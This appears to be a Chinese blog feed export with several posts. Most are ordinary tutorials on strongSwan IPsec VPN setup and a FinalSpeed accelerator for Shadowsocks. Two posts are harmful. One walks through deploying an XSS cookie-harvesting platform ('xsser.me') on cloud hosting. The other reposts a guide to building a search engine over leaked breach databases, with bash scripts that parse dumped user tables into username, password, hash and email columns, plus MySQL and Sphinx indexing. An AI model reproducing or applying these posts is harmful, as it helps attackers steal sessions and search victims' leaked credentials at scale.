<h2 id="启动strongSwan服务"><a href="#启动strongSwan服务" class="headerlink" title="启动strongSwan服务"></a>启动strongSwan服务</h2><p>启动和停止服务</p>
<div class="codehilite"><br><pre>sudo ipsec start<br>sudo ipsec stop<br></pre><br></div><br>也可以下载一个init脚本:<br><div class="codehilite"><br><pre>sudo wget -O /etc/init.d/strongswan \<br><a href="https://raw.githubusercontent.com/strongswan/strongswan/master/packages/strongswan/debian/strongswan-starter.ipsec.init" target="_blank" rel="external">https://raw.githubusercontent.com/strongswan/strongswan/master/packages/strongswan/debian/strongswan-starter.ipsec.init</a><br><br># 改一下ipsec的路径并添加执行权限<br>sudo sed -i ‘s|DAEMON=/usr/sbin|DAEMON=/usr/local/sbin|’ /etc/init.d/strongswan<br>sudo chmod +x /etc/init.d/strongswan<br></pre><br></div><br>以后就可以用service命令启动了<br><div class="codehilite"><br><pre>sudo service strongswan start<br>sudo service strongswan stop<br>sudo service strongswan restart<br></pre><br></div>

<h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>以Ubuntu 14.04为例，安装以下软件包:</p>
<div class="codehilite"><br><pre>sudo apt-get install network-manager-strongswan<br></pre><br></div><br>然后会自动安装相应的依赖包。注意strongswan和openswan不兼容，如果之前安装过openswan则会自动被卸载，相应的，l2tp vpn也会无法再使用。<br><br>可参考官方的NetworkManager<a href="https://wiki.strongswan.org/projects/strongswan/wiki/NetworkManager" target="_blank" rel="external">配置说明</a>。<br><br>## 常见问题<br><br>### Necessary secrets not provided<br><br>使用ubuntu的NetworkManager创建的strongSwan vpn连接(pubkey)报错:<br><div class="codehilite"><br><pre>Necessary secrets for the VPN connection were not provided.<br></pre><br></div><br>问题应该是NetworkManager没法从gnome-keyring获取密钥的密码引起的，安装完network-manager-strongswan包后重启下客户端操作系统(或者直接重启gnome-keyring-daemon服务)。<br><br>### 有的网站无法访问<br><br>问题表现为有的网站能正常访问，而有的网站死活刷不出来，在服务器端使用tcpdump可以捕获到如下错误:<br><div class="codehilite"><br><pre> ICMP xxx.xxx.xxx.xxx unreachable - need to frag (mtu 1422), length 556<br></pre><br></div><br>应该就是所谓的<a href="https://www.zeitgeist.se/2013/11/26/mtu-woes-in-ipsec-tunnels-how-to-fix/" target="_blank" rel="external">mtu问题</a>。<br><br>解决方法参考上面的文章，添加一条iptables规则:<br><div class="codehilite"><br><pre>iptables -t mangle -A FORWARD -o eth0 -p tcp -m tcp \<br>–tcp-flags SYN,RST SYN -m tcpmss –mss 1361:1536 \<br>-j TCPMSS –set-mss 1360<br></pre><br></div><br>注意，接口<code>-o eth0</code>一定要设置对，俺就在这里被坑了很久。<br><br>### 无法访问外部网站或IP<br><br>首先考虑配置（证书）是否正确，从命令行启动，看是否有什么异常输出。<br><div class="codehilite"><br><pre>sudo ipsec start<br># conn1 是/usr/local/etc/ipsec.conf里conn的名字<br>sudo ipsec up conn1<br></pre><br></div><br>其次，检查服务端的iptables是否正确配置，特别是接口是否配置正确，比如eth1写成了eth0。<br><br>## 参考资料<a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#35808e" target="_blank" rel="external">¶</a><br><br><em>   <a href="https://hjc.im/shi-yong-strongswanda-jian-ipsecikev2-vpn/" target="_blank" rel="external">使用Strongswan搭建IPSec/IKEv2 VPN</a>
</em>   <a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">strongSwan 5: How to create your own private VPN</a><br>*   <a href="https://wiki.strongswan.org/projects/strongswan/wiki/SimpleCA" target="_blank" rel="external">Setting-up a Simple CA Using the strongSwan PKI Tool</a><br><br>## 脚注<a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#content-references" target="_blank" rel="external">¶</a><br><br><div class="footnote"><br><br>1.  可以安装<code>virt-what</code>包来查看VPS使用的虚拟化技术。<br>2.  <a href="https://wiki.strongswan.org/projects/strongswan/wiki/Win7CertReq" target="_blank" rel="external">strongSwan Wiki#Requirements for certificates used with Windows 7</a>. 2015.04.08<br>3.  <a href="https://wiki.strongswan.org/projects/strongswan/wiki/IOS_%28Apple%29#Certificate-requirements-for-iOS-interoperability" target="_blank" rel="external">strongSwan Wiki#Certificate requirements for iOS interoperability</a>. 2015.04.08<br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Debian 8 设置IPSEC Strongswan]]></title>
      <url>http://www.linux52.com/2016-06-15-debian-8-e8-ae-be-e7-bd-aeipsec-strongswan.html</url>
      <content type="html"><![CDATA[<p>Debian 8 出来了，可是openswan 也没人维护了，之前配置的L2TP直接报废，强制安装降级openswan 不是个办法，刚好看到strongswan 维护的很好，貌似支持IOS8的CISCO VPN， 干脆就试验一把, 参考了这个文章里的配置，不过我其实用不到证书，也非常麻烦，所以作了一些改进，不过证书方面还是按照这篇文章里面的设置了。<br><a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/</a></p>
<p>首先当然是要安装stongswan 拉</p>
<p><code>apt-get install strongswan libcharon-extra-plugins</code></p>
<p>经过实验，Debian 7 也是完美支持的不过要特别安装</p>
<pre><code># echo &quot;deb http://ftp.debian.org/debian wheezy-backports main&quot; \
    &amp;gt; /etc/apt/sources.list.d/wheezy-backports.list
# apt-get update
# apt-get -t wheezy-backports install strongswan libcharon-extra-plugins
`&lt;/pre&gt;
然后检查一下ipsec的版本是不是安装好了

`ipsec version`

接下来就是建立Strongswan 密钥和证书了
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 4096 \
    --outform pem \
    &amp;gt; private/strongswanKey.pem
# chmod 600 private/strongswanKey.pem
# ipsec pki --self --ca --lifetime 3650 \
    --in private/strongswanKey.pem --type rsa \
    --dn &quot;C=CH, O=strongSwan, CN=strongSwan Root CA&quot; \
    --outform pem \
    &amp;gt; cacerts/strongswanCert.pem
`&lt;/pre&gt;
然后是服务器端的证书 替换文章中的vpn.zeitgeist.se 为自己服务器的域名，如果域名不一致会造成无法连接。
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 2048 \
    --outform pem \
    &amp;gt; private/vpnHostKey.pem
# chmod 600 private/vpnHostKey.pem
# ipsec pki --pub --in private/vpnHostKey.pem --type rsa | \
    ipsec pki --issue --lifetime 730 \
    --cacert cacerts/strongswanCert.pem \
    --cakey private/strongswanKey.pem \
    --dn &quot;C=CH, O=strongSwan, CN=vpn.zeitgeist.se&quot; \
    --san vpn.zeitgeist.se \
    --flag serverAuth --flag ikeIntermediate \
    --outform pem &amp;gt; certs/vpnHostCert.pem
`&lt;/pre&gt;
然后就是生成客户端证书了， 我生成了但是没有用， 只要ios上vpn， 可以用cisco的密码连接而不用证书， 文章里也生成了p12 证书，也是比较方便。
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 2048 \
    --outform pem \
    &amp;gt; private/AlexanderKey.pem
# chmod 600 private/AlexanderKey.pem
# ipsec pki --pub --in private/AlexanderKey.pem --type rsa | \
    ipsec pki --issue --lifetime 730 \
    --cacert cacerts/strongswanCert.pem \
    --cakey private/strongswanKey.pem \
    --dn &quot;C=CH, O=strongSwan, CN=alexander@zeitgeist.se&quot; \
    --san alexander@zeitgeist.se \
    --outform pem &amp;gt; certs/AlexanderCert.pem

# cd /etc/ipsec.d/
# openssl pkcs12 -export -inkey private/AlexanderKey.pem \
    -in certs/AlexanderCert.pem -name &quot;Alexander&apos;s VPN Certificate&quot; \
    -certfile cacerts/strongswanCert.pem \
    -caname &quot;strongSwan Root CA&quot; \
    -out Alexander.p12
`&lt;/pre&gt;
接下来就是关键中的关键了。 ipsec的配置 修改ipsec.conf 相对于原文章我主要修改了这段 conn CiscoIPSec 让普通的IOS CISCO 客户端通过密码也可以联入IPSEC VPN
&lt;pre&gt;`# ipsec.conf - strongSwan IPsec configuration file

config setup  
    # uniqueids=never
    charondebug=&quot;cfg 2, dmn 2, ike 2, net 2&quot;

conn %default  
    keyexchange=ikev2
    ike=aes128-sha256-ecp256,aes256-sha384-ecp384,aes128-sha256-modp2048,aes128-sha1-modp2048,aes256-sha384-modp4096,aes256-sha256-modp4096,aes256-sha1-modp4096,aes128-sha256-modp1536,aes128-sha1-modp1536,aes256-sha384-modp2048,aes256-sha256-modp2048,aes256-sha1-modp2048,aes128-sha256-modp1024,aes128-sha1-modp1024,aes256-sha384-modp1536,aes256-sha256-modp1536,aes256-sha1-modp1536,aes256-sha384-modp1024,aes256-sha256-modp1024,aes256-sha1-modp1024!
    esp=aes128gcm16-ecp256,aes256gcm16-ecp384,aes128-sha256-ecp256,aes256-sha384-ecp384,aes128-sha256-modp2048,aes128-sha1-modp2048,aes256-sha384-modp4096,aes256-sha256-modp4096,aes256-sha1-modp4096,aes128-sha256-modp1536,aes128-sha1-modp1536,aes256-sha384-modp2048,aes256-sha256-modp2048,aes256-sha1-modp2048,aes128-sha256-modp1024,aes128-sha1-modp1024,aes256-sha384-modp1536,aes256-sha256-modp1536,aes256-sha1-modp1536,aes256-sha384-modp1024,aes256-sha256-modp1024,aes256-sha1-modp1024,aes128gcm16,aes256gcm16,aes128-sha256,aes128-sha1,aes256-sha384,aes256-sha256,aes256-sha1!
    dpdaction=clear
    dpddelay=300s
    rekey=no
    left=%any
    leftsubnet=0.0.0.0/0
    leftcert=vpnHostCert.pem
    right=%any
    rightdns=8.8.8.8,8.8.4.4
    rightsourceip=172.16.16.0/24

conn IPSec-IKEv2  
    keyexchange=ikev2
    auto=add

conn IPSec-IKEv2-EAP  
    also=&quot;IPSec-IKEv2&quot;
    rightauth=eap-mschapv2
    rightsendcert=never
    eap_identity=%any

conn CiscoIPSec  
        keyexchange=ikev1
        leftsendcert=never
        #do not need server side cert
        leftauth=psk
        rightauth=psk
        #use PSK as client server auth type
        rightauth2=xauth
        #use xauth as user login auth type
        auto=add
`&lt;/pre&gt;
接着修改密码文件， 替换中间 topsecretpassword1， topsecretpassword2 ，evenmoretopsecretpassword 到自己设定的密码就可以了。
&lt;pre&gt;`/etc/ipsec.secrets

： PSK &quot;topsecretpassword1&quot;
: RSA vpnHostKey.pem
user1 : EAP &quot;topsecretpassword2&quot;  
user1 : XAUTH &quot;evenmoretopsecretpassword&quot;  
`&lt;/pre&gt;
然后热倒入一下密码

`#ipsec rereadsecrets`

一般这样就七七八八差不多了， 最后就是给iptables 设置规则， 最简单的就是IPV4 转发, xxx.xxx.xxx.xxx 改成服务器IP。
&lt;pre&gt;`# echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
# echo 0 &amp;gt; /proc/sys/net/ipv4/conf/all/accept_redirects
# echo 0 &amp;gt; /proc/sys/net/ipv4/conf/all/send_redirects
# iptables -t nat -A POSTROUTING -o eth0 ! -p esp \
    -j SNAT --to-source xxx.xxx.xxx.xxx

# iptables -A INPUT -p udp --dport 500 --j ACCEPT
# iptables -A INPUT -p udp --dport 4500 --j ACCEPT
# iptables -A INPUT -p esp -j ACCEPT
</code></pre><p>最后，重起一下 ipsec 吧，万事俱备了。</p>
<p><code># service ipsec restart</code></p>
<p>IOS8 CISCO 客户端的配置就非常方便了<br>新建VPN 并设置Cisco 类型，填入服务器地址，用户名，密码和PSK 密码，就可以以不需要客户端证书而是直接密码方式进行VPN连接了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[如何在sea安装xsser.me]]></title>
      <url>http://www.linux52.com/2016-05-16-e5-a6-82-e4-bd-95-e5-9c-a8sea-e5-ae-89-e8-a3-85xsser-me.html</url>
      <content type="html"><![CDATA[<p>源码看这个<a href="http://zone.wooyun.org/content/13519" target="_blank" rel="external">http://zone.wooyun.org/content/13519</a></p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607505923.zip" target="_blank" rel="external">xss平台源码（邮件提醒，飞信短信提醒，短网址，Bootstrap框架）</a></p>
<p>1.创一个空的php应用（不用多说了 mysql初始化）<br>2.本地先架设好测试成功代码（因为sea上没有权限所以。。。）</p>
<h1 id="3-把测试好的代码打包好zip"><a href="#3-把测试好的代码打包好zip" class="headerlink" title="3.把测试好的代码打包好zip"></a>3.把测试好的代码打包好zip</h1><p>sea平台操作</p>
<p>控至台===》sea应用管理===&gt;&gt;应用===》代码管理===》创建版本====》上传你本地的code.zip</p>
<p><strong>这里为什么不用svn 尼玛传不了说什么出错我也搞不明白 我还在社区请教了都没人回</strong></p>
<p>结下来就是倒入sql数据 修改rewite规测 和配至文件</p>
<pre class="prettyprint linenums">
config.yml
handle:
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/([0-9a-zA-Z]{6})$" ) goto "/index.php?do=code&urlKey=$1"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/do/auth/(\w+?)(/domain/([\w\.]+?))?$" ) goto "/index.php?do=do&auth=$1&domain=$3"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/register/(.*?)$" ) goto "/index.php?do=register&key=$1"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/register-validate/(.*?)$" ) goto "/index.php?do=register&act=validate&key=$1"
- errordoc:  404 /index.html
- errordoc:  200 /index.php
- errordoc:  403 /index.html
</pre>
config.php
<pre class="prettyprint linenums">
/* 数据库连接 */
$config['dbHost']    = SAE_MYSQL_HOST_M.':'.SAE_MYSQL_PORT;  //数据库地址
$config['dbUser']    = SAE_MYSQL_USER;        //用户
$config['dbPwd']    = SAE_MYSQL_PASS;        //密码
$config['database']    = SAE_MYSQL_DB;      //数据库名
$config['charset']    ='utf8';        //数据库字符集
$config['tbPrefix']    ='oc_';          //表名前缀
$config['dbType']    ='mysql';        //数据库类型(目前只支持mysql)
</pre>

<p>好了这样就可以了 重点就是  $config[‘dbHost’]    = SAE_MYSQL_HOST_M.’:’.SAE_MYSQL_PORT;  //数据库地址<br>搞了N久原来没有PORT写入死活不行</p>
<p>现在正常了 可以收信HOHO 源码自代的</p>
<p>PS：话说sea好贵的 明天等我bae认证下来拿到bae上测试下<br>另求牛逼的XSS平台源码</p>
<p>上测试图<a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607525339.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607525339.png" alt="12"></a><a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607515199.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607515199.png" alt="11"></a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[如何设计搭建一个社工库]]></title>
      <url>http://www.linux52.com/2016-03-21-e5-a6-82-e4-bd-95-e8-ae-be-e8-ae-a1-e6-90-ad-e5-bb-ba-e4-b8-80-e4-b8-aa-e7-a4-be-e5-b7-a5-e5-ba-93.html</url>
      <content type="html"><![CDATA[<p><a href="http://le4f.net/post/post/build-social-engineer-evildata-search-engine" target="_blank" rel="external">http://le4f.net/post/post/build-social-engineer-evildata-search-engine</a></p>
<h4 id="如何设计搭建一个社工库"><a href="#如何设计搭建一个社工库" class="headerlink" title="如何设计搭建一个社工库"></a>如何设计搭建一个社工库</h4><p>从初起设计一个社工库，到现在的Beta，前前后后零零整整花了不下一个月的时间，林林总总记录下来，留给需要之人</p>
<p>泄露数据库格式不一，长相奇葩，因需将用户名、密码、邮箱、哈希等信息按表分列入库，故整理数据是很耗时间的一步</p>
<h5 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h5><p>选择了Debian x64+Mysql+Mysqlcft+Sphinx+Nginx+PHP</p>
<p>轻量的sqlite数据库，但查询速度及空间消耗过大，对请求时sqlite处理效率较差</p>
<p>mangodb，但mangodb在分布计算中有更好的优势而在社工库搭建中优势并不明显</p>
<p>在mysql和postgresql中，选择历久弥新的mysql</p>
<p>为方便社工库移植，使用VM建一个虚拟机，所有数据库均在虚拟机中，LNMP环境对外只提供PHP查询接口</p>
<p>实际测试中，CentOS6.4虚拟机中因断电损失过多数据，并不如预想中稳定，且对CoreSeek版本较老的mmseg中文分词编译会出现各种各样的问题，难以解决。32位的操作系统在sphinx单个索引大小上会有限制，几次折腾后还是迁回了Debian7 X64</p>
<h5 id="整理数据"><a href="#整理数据" class="headerlink" title="整理数据"></a>整理数据</h5><p>一般使用bash脚本完成。DEMO：</p>
<p>普通格式：</p>
<pre><code>#!/bin/bash
sed &apos;/^[ \t]\{0,\}$/d&apos; $1  sed &apos;s/[\t ]/\t/g&apos;  sed &apos;s/\r//g&apos; sed &apos;/^\s*$/d&apos;  awk -F&quot;\t&quot; &apos;{print &quot;NULL&quot;$1&quot;&quot;$2&quot;&quot;$1&quot;xxxx&quot; }&apos;  iconv -c -f gb18030 -t UTF-8  sort  uniq 
he`&lt;/pre&gt;
UCmember格式：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/[\r\n ]//g&apos; $1  tr -d &apos;\n&apos;  sed &quot;s/INSERTINTO\`bbs\_uc\_members\`VALUES(//g&quot;  sed &quot;s/&apos;,&apos;/\t/g&quot;  sed &quot;s/,&apos;/\t/g&quot;  sed &quot;s/&apos;,/\t/g&quot; sed &quot;s/&apos;);/\n/g&quot;  awk -F&quot;\t&quot; &apos;{ print &quot;NULL&quot;$2&quot;&quot;$3&quot;&quot;$9&quot;&quot;$4&quot;&quot;$7&quot;xxxx+xxxx+evil++&quot;}&apos;  sed &quot;/+evil++/d&quot;`&lt;/pre&gt;
PW_MEMBER格式：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/[\r\n ]//g&apos; $1  tr -d &apos;\n&apos;  sed &quot;s/INSERTINTO\`pw_members\`VALUES(&apos;/\n/g&quot;  sed &quot;s/&apos;,&apos;/\t/g&quot;  awk -F&quot;\t&quot; &apos;{ print $1&quot;&quot;$2&quot;&quot;$3&quot;&quot;$5&quot;xxxx&quot;}&apos;  sed &quot;/+evil++/d&quot;`&lt;/pre&gt;
文件内格式不同的处理脚本eg：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/\r//g&apos; $1  sed &quot;s/&apos;/[fenhao]/g&quot;  sed &apos;s/[ \t]\{1,\}/\t/g&apos;  sed &apos;s/-/\t/g&apos;  awk -F &quot;\t&quot; &apos;{ if ($2~/@163.com/)
{
if ($3~/^$/) {print &quot;NULL&quot;$1&quot;&quot;$2$3&quot;&quot;}
else {print &quot;NULL&quot;$1&quot;&quot;$3&quot;&quot;}
}
else
{print &quot;NULL&quot;$1&quot;&quot;$2&quot;&quot;}
}&apos;  iconv -c -f gb18030 -t UTF-8  sort  uniq`&lt;/pre&gt;
批量按行导入：
&lt;pre&gt;`#!/bin/bash
sed &apos;/^[ \t]\{0,\}$/d&apos; $1  sed &apos;s/\r//g&apos;  sed &apos;/^\s*$/d&apos;  awk &apos;{print &quot;NULL&quot;$0&quot;xxxx&quot; }&apos;`&lt;/pre&gt;
对于数据库设计也尤为重要。测试后、按表存储、单表记录数不超过3W，否则建全文索引时间过长。

##### 库表设计

&lt;pre&gt;`CREATE TABLE `evil_xxxx_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`username` VARCHAR( 64 ) ,
`password` VARCHAR( 64 ) ,
`passhash` VARCHAR( 64 ) ,
`email` VARCHAR( 64 )
);

CREATE TABLE `evil_ucmember_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`username` VARCHAR( 64 ) ,
`password` VARCHAR( 64 ) ,
`passhash` VARCHAR( 64 ) ,
`salt` VARCHAR( 16 ) ,
`email` VARCHAR( 64 ) ,
`ip` VARCHAR( 32 ) ,
`site` VARCHAR( 64 ) ,
PRIMARY KEY (id)
);

CREATE TABLE `evil_multinfo_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`info` VARCHAR( 1024 ) ,
`site` VARCHAR( 64 ) ,
PRIMARY KEY (id)
);`&lt;/pre&gt;
分表的一个方案：
&lt;pre&gt;`INSERT INTO evil_xx_1(evil_xx.id,evil_xx.username,evil_xx.password,evil_xx.passhash) SELECT (evil_xx.id,evil_xx.username,evil_xx.password,evil_xx.passhash)FROM evil_xx where user.id &amp;lt;= 30;`&lt;/pre&gt;

##### 命令查询

&lt;pre&gt;`show table status;//查看数据库状态
desc table; //查看表结构
set names &apos;utf8&apos;;//设置编码，数据表统一编码UTF-8
drop index index_name on table_name; //删除索引
alter table table_name add primary key(id);//添加主键
alter table table_name drop PRIMARY KEY;//去掉主键
truncate table table_name;//清空表中数据
alter table 表名 rename to 新表名;//重命名表
alter table table_name change Name Name varchar(16);//重命名列及格式
alter table table_name add column xxxx varchar(64) after aaaa;//添加列
alter table 表名 drop column 列名;//删除列
set @t=0;
update table_name set id=(@t:=@t+1);//重建ID`&lt;/pre&gt;

##### 导入数据

&lt;pre&gt;`load data infile &apos;/tmp/xxxx.sql&apos; 
into table `evil_xxxx` 
fields terminated by &apos;&apos;
lines terminated by &apos;\n&apos;;`&lt;/pre&gt;
速度相对较快

##### 关于索引

中文全文索引主要依赖mysqlctf和sphinx，测试发现，sphinx对于分词索引速度较快，但分词的原因导致诸如搜索humor却搜索不到humorous的情况，而mysqlctf索引速度相对较慢且无进度信息，但索引大小可控，一般全文索引1G数据库信息对应MYI大小为5-9G

关于Coreseek的编译使用，官方有较多文档

Sphinx配置文件（全文检索包括分词及最小分词5字母）
&lt;pre&gt;`source evil_xxx
{
  type              = mysql
  sql_host          = localhost
  sql_user          = ooo
  sql_pass          = xxx
  sql_db            = db
  sql_port          = 3306
  sql_query_pre     = SET NAMES utf8
  sql_query         = SELECT id,username,password,passhash,email FROM xxxx
  sql_query_info    = SELECT * FROM xxxx WHERE id=$id
}

index evil_xxx
{
  source            = evil_xxx
  path              = /usr/local/coreseek/var/data/evil_xxx
  docinfo           = extern
  mlock             = 0
  morphology        = none
  min_word_len      = 1
  html_strip        = 0
  charset_dictpath  = /usr/local/mmseg3/etc/
  charset_type      = zh_cn.utf-8
  ngram_len         = 0
  min_infix_len     = 5
  enable_star       = 1//允许模糊搜索
}`&lt;/pre&gt;
检索时调用官方API即可

关于MYSQLCFT建立索引的方法

首先是安装插件
&lt;pre&gt;`wget http://mysqlcft.googlecode.com/files/mysqlcft-1.0.0-x86_64-bin.tar.gz
tar zxvf mysqlcft-1.0.0-x86_64-bin.tar.gz
mkdir -p /usr/local/mysqlcft/lib/mysql/plugin/
cp mysqlcft.so /usr/local/mysqlcft/lib/mysql/plugin/`&lt;/pre&gt;
登陆mysql后
&lt;pre&gt;`INSTALL PLUGIN mysqlcft SONAME &apos;mysqlcft.so&apos;;
SHOW PLUGINS;`&lt;/pre&gt;
安装OK后建立索引
&lt;pre&gt;`ALTER IGNORE TABLE 数据库名.表名 ADD FULLTEXT INDEX 全文联合索引名 (字段名1,字段名2) WITH PARSER mysqlcft;`&lt;/pre&gt;
如
&lt;pre&gt;`ALTER IGNORE TABLE db.evil_xxxx ADD FULLTEXT INDEX fullindex(username，password,passhash,email) WITH PARSER mysqlcft;`&lt;/pre&gt;
在搜索时
&lt;pre&gt;`SELECT * FROM evil_xxxx WHERE MATCH(username,password,passhash,email) AGAINST (&apos;searchinfo&apos; IN BOOLEAN MODE);`&lt;/pre&gt;
重建索引
&lt;pre&gt;`REPAIR TABLE 数据库名.表名 QUICK;
</code></pre><h5 id="几个Tips"><a href="#几个Tips" class="headerlink" title="几个Tips"></a>几个Tips</h5><ul>
<li>增加来源数据库/网站字段，方便针对查询</li>
<li>同库分隔符格式不同，正则替换</li>
<li>数据库引擎选择myisam（而不是INNODB），可使用alter转换</li>
<li>入库分隔符为避免与密码字符重合，可使用类似==aaaa==等分隔符替换入库</li>
<li>数据库中有的邮箱在前密码在后，有的密码在前，邮箱在后，使用awk多写几行分支语句</li>
<li>配置my.cnf文件使得mysql数据处理效率最大化<br>From Le4F’Blog</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[搬瓦工VPS/OPENVZ加速利器FINALSPEED]]></title>
      <url>http://www.linux52.com/2016-03-18-e6-90-ac-e7-93-a6-e5-b7-a5vpsopenvz-e5-8a-a0-e9-80-9f-e5-88-a9-e5-99-a8finalspeed.html</url>
      <content type="html"><![CDATA[<p>FinalSpeed是高速双边加速软件,可加速所有基于tcp协议的网络服务,在高丢包和高延迟环境下,仍可达到90%的物理带宽利用率,即使高峰时段也能轻松跑满带宽.它的前身是xsocks，今天在一台openvz架构vps上测试了一下效果非常明显，简直是咸鱼翻身。所谓双边加速就是服务端和客户端都要安装，PS：这个不是用来扶墙的，而是可以给ss等扶墙工具加速的。所以如果你经济有限，只能买一台<a href="http://www.cmsky.com/bandwagonhost-promo/" target="_blank" rel="external">搬瓦工</a>vps，但是又苦于晚高峰时的表现，那么FinalSpeed是最适合你的方案了。</p>
<p>项目Github地址：<a href="https://github.com/d1sm/finalspeed" target="_blank" rel="external">https://github.com/d1sm/finalspeed</a></p>
<p>论坛： <a href="http://www.d1sm.net/forum-44-1.html" target="_blank" rel="external">http://www.d1sm.net/forum-44-1.html</a></p>
<h4 id="一、服务端安装"><a href="#一、服务端安装" class="headerlink" title="一、服务端安装"></a>一、服务端安装</h4><p>注意问题:<br>服务端会启动iptables,如果服务器修改过ssh端口,请先开放ssh端口,否则可能导致ssh连接失败.<br>开放端口命令<br>service iptables start<br>iptables -A INPUT -p tcp –dport 端口号 -j ACCEPT<br>iptables -A OUTPUT -p tcp –sport 端口号 -j ACCEPT<br>service iptables save</p>
<p>一键安装，一键脚本非常方便，我在debian7上安装很顺利<br>rm -f install_fs.sh<br>wget  <a href="http://fs.d1sm.net/finalspeed/install_fs.sh" target="_blank" rel="external">http://fs.d1sm.net/finalspeed/install_fs.sh</a><br>chmod +x install_fs.sh<br>./install_fs.sh 2&gt;&amp;1 | tee install.log</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed1.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed1.png" alt="FinalSpeed"></a></p>
<p>如图所示就是安装成功的，FinalSpeed is running.正在运行。运行正常可以直接看<strong>第二步</strong>。</p>
<p>debian,ubuntu下如果执行脚本出错,请切换到dash,<br>切换方法: sudo dpkg-reconfigure dash 选no</p>
<p>更新<br>执行一键安装会自动完成更新.</p>
<p>卸载<br>sh /fs/stop.sh ; rm -rf /fs</p>
<p>启动<br>sh /fs/start.sh</p>
<p>停止<br>sh /fs/stop.sh</p>
<p>重新启动<br>sh /fs/restart.sh</p>
<p>日志<br>tail -f /fs/server.log</p>
<p>设置服务端口<br>默认udp 150和tcp 150 ,由于finalspeed的工作原理,请不要在本机防火墙开放finalspeed所使用的tcp端口.<br>mkdir -p /fs/cnf/ ; echo 端口号 &gt; /fs/cnf/listen_port ; sh /fs/restart.sh</p>
<p>设置开机启动<br>chmod +x /etc/rc.local<br>vi /etc/rc.local<br>加入<br>sh /fs/start.sh</p>
<p>每天晚上3点自动重启<br>crontab -e<br>加入<br>0 3 <em> </em> *  sh /fs/restart.sh</p>
<h4 id="二、客户端设置"><a href="#二、客户端设置" class="headerlink" title="二、客户端设置"></a>二、客户端设置</h4><p><span class="download"><a href="http://fs.d1sm.net/finalspeed/finalspeed_install1.0.exe" title="FinalSpeed" target="_blank" rel="external">Windows客户端下载</a></span></p>
<p>1.服务器必须同时部署FinalSpeed服务端才能进行加速.<br>2.客户端必须准确设置物理带宽,最终加速的速度不会超过所设置的带宽值,如果设置值高于实际物理带宽会造成丢包和不必要的重传.<br>3.客户端首选udp协议,如果udp不稳定,请切换到tcp.<br>4.若服务器为openvz架构（比如搬瓦工）,客户端只能选择udp协议,其他架构同时支持tcp和udp协议.<br>5.windows客户端使用tcp协议时不兼容锐速,停止锐速后可以正常运行.</p>
<p><strong>加速ss教程（前提是你本地ss已经测试过没问题）</strong><br>假设服务器IP为10.10.10.10,finalspeed端口为默认150,ss端口为8989.<br>加速前提ss服务端运行正常,ss客户端也能正常登录.<br>1.运行FinalSpeed客户端,填写服务器地址 10.10.10.10 .设置带宽，根据你实际带宽设置，比如我这里是10M上下行对等光纤。</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed2.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed2.png" alt="FinalSpeed"></a></p>
<p>2.点击添加,增加加速端口,加速端口为ss端口8989,如果为其他端口,请相应修改,本地端口任意,这里是2000 .传输协议UDP</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed3.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed3.png" alt="FinalSpeed"></a></p>
<p>3.打开ss客户端,添加服务器,服务器IP为127.0.0.1,服务器端口为加速端口对应的本地端口,这里是2000,然后设置你的ss密码,加密方式.</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed4.jpg" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed4.jpg" alt="FinalSpeed"></a></p>
<p>4.确定保存,选择使用刚添加的服务器,并设置浏览器代理,成功连接后,FinalSpeed状态栏会出现”连接服务器成功”提示.更多教程访问<a href="http://www.d1sm.net/thread-7-1-1.html" target="_blank" rel="external">作者论坛</a>。</p>
<p>总结：本人实测如果你服务端是manyuser也可以加速，但是你得让每个端口的用户都装上FinalSpeed，太麻烦。所以这个东东最适合的就是经济有限，只能买个<a href="http://www.cmsky.com/bandwagonhost-promo/" target="_blank" rel="external">搬瓦工</a>等openvz架构的vps自用的同学。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[shadowscoke客户 gui版]]></title>
